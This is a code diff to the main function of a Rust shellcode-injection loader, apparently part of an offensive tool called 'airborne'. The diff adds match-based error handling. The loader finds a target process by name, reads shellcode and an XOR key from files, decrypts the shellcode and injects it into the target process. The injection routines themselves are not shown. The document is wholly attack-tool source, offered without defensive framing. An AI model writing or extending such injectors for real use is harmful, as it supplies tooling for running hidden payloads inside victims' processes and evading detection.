@@ -15,24 +15,51 @@ struct Args {
 
 fn main() {
     let args = parse_args();
-    let proc_id =
-        unsafe { process::iterate_procs(&args.procname).expect("failed to find matching PID") };
+    let proc_id = unsafe {
+        match process::iterate_procs(&args.procname) {
+            Ok(Some(pid)) => pid,
+            Ok(None) => {
+                println!("[!] process with name {} not found", args.procname);
+                exit(1);
+            }
+            Err(e) => {
+                println!("[!] error during process iteration: {}", e);
+                exit(1);
+            }
+        }
+    };
 
-    let mut shellcode = fs::read(&args.shellcode_path).expect("failed to read shellcode");
+    let mut shellcode = match fs::read(&args.shellcode_path) {
+        Ok(shellcode) => shellcode,
+        Err(e) => {
+            println!("[!] failed to read shellcode: {}", e);
+            exit(1);
+        }
+    };
+
+    let keyfile = match fs::read(&args.keyfile_path) {
+        Ok(keyfile) => keyfile,
+        Err(e) => {
+            println!("[!] failed to read xor keyfile: {}", e);
+            exit(1);
+        }
+    };
 
     if args.offset >= shellcode.len() {
         println!("[!] offset is greater or equal than shellcode length");
         exit(1);
     }
 
-    let keyfile = fs::read(&args.keyfile_path).expect("failed to read keyfile");
     println!("[+] xor'ing shellcode");
     airborne_utils::xor_cipher(&mut shellcode, &keyfile);
 
     println!("[+] injecting shellcode into {}", args.procname);
-    unsafe { inject::inject(proc_id, shellcode) };
-
-    println!("[+] done");
+    unsafe {
+        match inject::inject(proc_id, shellcode) {
+            Ok(_) => println!("[+] done"),
+            Err(e) => println!("[!] failure during injection: {}", e),
+        }
+    };
 }
 
 fn parse_args() -> Args {
